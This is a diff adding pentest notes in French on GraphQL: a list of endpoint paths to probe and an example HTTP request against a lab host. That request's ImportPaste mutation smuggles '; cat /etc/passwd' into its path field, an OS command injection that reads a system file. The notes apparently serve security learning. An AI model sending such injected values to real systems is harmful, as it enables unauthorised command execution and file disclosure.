@@ -49,3 +49,37 @@ OWASP Zap
 dev.
 api.
 
+### detect graphQL
+
+/graphql
+/v1/graphql
+/api/graphql
+/v1/api/graphql
+Attacking GraphQL   291
+/graph
+/v1/graph
+/graphiql
+/v1/graphiql
+/console
+/query
+/graphql/console
+/altair
+/playground
+
+### exemples
+
+#### exemple type d'injection GraphQL retournant le fichier /etc/passwd
+
+```sh
+POST /graphql HTTP/1.1
+Host: 192.168.195.132:5000
+Accept: application/json
+Content-Type: application/json
+
+{"variables": {"scheme": "http",
+"path": "/ ; cat /etc/passwd",
+"port": 80, "host": "test.com"},
+"query": "mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!)
+{\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme)
+{\n result\n }\n }"}
+```
